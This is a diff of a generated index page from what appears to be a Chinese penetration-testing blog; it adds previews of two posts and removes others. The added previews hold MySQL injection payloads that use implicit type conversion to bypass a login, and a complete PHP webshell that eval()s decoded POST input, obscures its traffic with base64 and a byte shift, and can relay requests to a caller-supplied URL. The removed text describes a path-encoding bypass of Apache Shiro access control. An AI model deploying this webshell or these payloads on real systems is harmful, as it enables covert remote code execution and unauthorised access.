@@ -117,6 +117,214 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/01/05/SQL隐形转换绕过waf.html" >SQL隐形弱类型转换绕过</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-01-05  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
+<p>如果PHP语句中存在这样的登录漏洞比如：</p>
+<p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p>
+<p>但是在登录框处限制了用户名长度</p>
+<pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;
+print &quot;用户名不能超过4个字符串&quot;;
+echo $user;
+echo strlen($user);
+die();
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果未做限制的情况下可以构造这样的语句<br><code>select * from users where userid = 1 or 1=1</code></p>
+<p>在限制的情况下可以利用sql隐形转换这样子：<br><code>select * from users where userid=&#39;&#39;=0#</code></p>
+<p>这个就全部选择出来了，然后重要的点在后面<code>userid=&#39;&#39;=0#</code>，闭合前面单引号，于是整个数值就恒等于了，也可以这么写</p>
+<p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p>
+<p>基本原理就是上面文章提到的：</p>
+	
+
+	</div>
+  <a type="button" href="/2017/01/05/SQL隐形转换绕过waf.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
+<p>如果PHP语句中存在这样的登录漏洞比如：</p>
+<p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p>
+<p>但是在登录框处限制了用户名长度</p>
+<pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;
+print &quot;用户名不能超过4个字符串&quot;;
+echo $user;
+echo strlen($user);
+die();
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果未做限制的情况下可以构造这样的语句<br><code>select * from users where userid = 1 or 1=1</code></p>
+<p>在限制的情况下可以利用sql隐形转换这样子：<br><code>select * from users where userid=&#39;&#39;=0#</code></p>
+<p>这个就全部选择出来了，然后重要的点在后面<code>userid=&#39;&#39;=0#</code>，闭合前面单引号，于是整个数值就恒等于了，也可以这么写</p>
+<p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p>
+<p>基本原理就是上面文章提到的：</p>
+	
+	</div>
+  <a type="button" href="/2017/01/05/SQL隐形转换绕过waf.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/01/04/加密webshell流量.html" >加密webshell流量</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-01-04  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+function easy_en($str) &#123;
+    $ret &#x3D; &quot;&quot;;
+    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
+        $old &#x3D; ord($str[$i]);
+        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
+        else $new &#x3D; $old -1;
+        $ret .&#x3D; chr($new);
+    &#125;
+    return $ret;
+&#125;
+
+function easy_de($str) &#123;
+    $ret &#x3D; &quot;&quot;;
+    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
+        $old &#x3D; ord($str[$i]);
+        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
+        else $new &#x3D; $old + 1;
+        $ret .&#x3D; chr($new);
+    &#125;
+    return $ret;
+&#125;
+
+if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
+    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
+&#x2F;&#x2F;    var_dump($c);
+    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
+        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
+        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
+        &#39;content&#39;&#x3D;&gt;$c),
+    ));
+    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
+&#x2F;&#x2F;    var_dump($c);
+    die(easy_de(base64_decode($c)));
+&#125;
+
+function shutdown() &#123;
+    $str &#x3D; ob_get_contents();
+    ob_end_clean();
+    echo base64_encode(easy_en($str));
+&#125;
+
+register_shutdown_function(&quot;shutdown&quot;);
+ob_start();
+$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
+parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
+eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
+?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+function easy_en($str) &#123;
+    $ret &#x3D; &quot;&quot;;
+    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
+        $old &#x3D; ord($str[$i]);
+        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
+        else $new &#x3D; $old -1;
+        $ret .&#x3D; chr($new);
+    &#125;
+    return $ret;
+&#125;
+
+function easy_de($str) &#123;
+    $ret &#x3D; &quot;&quot;;
+    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
+        $old &#x3D; ord($str[$i]);
+        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
+        else $new &#x3D; $old + 1;
+        $ret .&#x3D; chr($new);
+    &#125;
+    return $ret;
+&#125;
+
+if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
+    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
+&#x2F;&#x2F;    var_dump($c);
+    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
+        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
+        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
+        &#39;content&#39;&#x3D;&gt;$c),
+    ));
+    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
+&#x2F;&#x2F;    var_dump($c);
+    die(easy_de(base64_decode($c)));
+&#125;
+
+function shutdown() &#123;
+    $str &#x3D; ob_get_contents();
+    ob_end_clean();
+    echo base64_encode(easy_en($str));
+&#125;
+
+register_shutdown_function(&quot;shutdown&quot;);
+ob_start();
+$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
+parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
+eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
+?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/01/03/sql中转.html" >Sqlmap备忘录</a>
 		</h3>
 		</div>
@@ -475,248 +683,6 @@ headers <span class="token operator">=</span> <span class="token punctuation">&#
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/10/25/cve-2016-6802.html" >CVE-2016-6802</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-10-25  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p>
-</blockquote>
-<p>描述比较简单，官方修改的时候对于最新版本做了简单的修改：</p>
-<pre class="line-numbers language-none"><code class="language-none">
-WebUtils.java
-+ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));
-if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
-    contextPath &#x3D; &quot;&quot;;
- &#125;
- return contextPath;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>主要添加了上面一行，在请求处理之前先decoded，然后恢复正常。所以最后的exp很简单：</p>
-<p>比如作为一个普通账户的时候，知道admin路径，在访问的时候访问admin路径，然后burp截断，在请求路径后面添加<code>%2f</code>，即可绕过shiro路径控制。</p>
-
-	
-
-	</div>
-  <a type="button" href="/2016/10/25/cve-2016-6802.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p>
-</blockquote>
-<p>描述比较简单，官方修改的时候对于最新版本做了简单的修改：</p>
-<pre class="line-numbers language-none"><code class="language-none">
-WebUtils.java
-+ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));
-if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
-    contextPath &#x3D; &quot;&quot;;
- &#125;
- return contextPath;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>主要添加了上面一行，在请求处理之前先decoded，然后恢复正常。所以最后的exp很简单：</p>
-<p>比如作为一个普通账户的时候，知道admin路径，在访问的时候访问admin路径，然后burp截断，在请求路径后面添加<code>%2f</code>，即可绕过shiro路径控制。</p>
-
-	
-	</div>
-  <a type="button" href="/2016/10/25/cve-2016-6802.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/10/08/docker.html" >Docker笔记</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-10-08  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
-<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
-</ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>
-
-<span class="token function">docker</span> run -t -i ubuntu /bin/bash
-<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>
-
-<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>
-
-<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
-<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>
-
-上面两个命令用一个命令代替：
-<span class="token function">docker</span> start -a -i e0521aa52895
-<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>
-
-如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
-<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash
-
-<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
-<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
-<span class="token comment">#删除所有退出状态的容器</span>
-
-<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
-<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
-<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
-docker exec web ls
-docker start web
-docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
-<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
-bzip2 -d -c &lt; img.tar.bz2 |docker load
-
-
-docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
-bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
-<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04
-
-ENV ROOT_PATH &#x2F;root
-RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
-WORKDIR $ROOT_PATH
-RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
-WORKDIR &#x2F;root&#x2F;lnmp1.3-full
-RUN echo -e 8e17f72 | bash install.sh
-
-
-EXPOSE 80 3306 9000
-CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
-mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
-mysql -uroot -p
-
-update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
-FLUSH PRIVILEGES;
-quit
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
-<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
-</ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>
-
-<span class="token function">docker</span> run -t -i ubuntu /bin/bash
-<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>
-
-<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>
-
-<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
-<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>
-
-上面两个命令用一个命令代替：
-<span class="token function">docker</span> start -a -i e0521aa52895
-<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>
-
-如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
-<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash
-
-<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
-<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
-<span class="token comment">#删除所有退出状态的容器</span>
-
-<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
-<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
-<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
-docker exec web ls
-docker start web
-docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
-<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
-bzip2 -d -c &lt; img.tar.bz2 |docker load
-
-
-docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
-bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
-<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04
-
-ENV ROOT_PATH &#x2F;root
-RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
-WORKDIR $ROOT_PATH
-RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
-WORKDIR &#x2F;root&#x2F;lnmp1.3-full
-RUN echo -e 8e17f72 | bash install.sh
-
-
-EXPOSE 80 3306 9000
-CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
-mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
-mysql -uroot -p
-
-update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
-FLUSH PRIVILEGES;
-quit
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -766,7 +732,7 @@ quit
 		
 			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
 		
-			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+			<li><a href="/categories/Fun/">Fun<span>4</span></a></li>
 		
 			<li><a href="/categories/Java/">Java<span>8</span></a></li>
 		
@@ -774,7 +740,7 @@ quit
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -795,6 +761,14 @@ quit
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
+      </li>
+    
+      <li>
         <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
       </li>
     
@@ -804,14 +778,6 @@ quit
     
       <li>
         <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
       </li>
     
   </ul>
@@ -829,7 +795,7 @@ quit
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2022 JKme's Blog
+  &copy; 2023 JKme's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
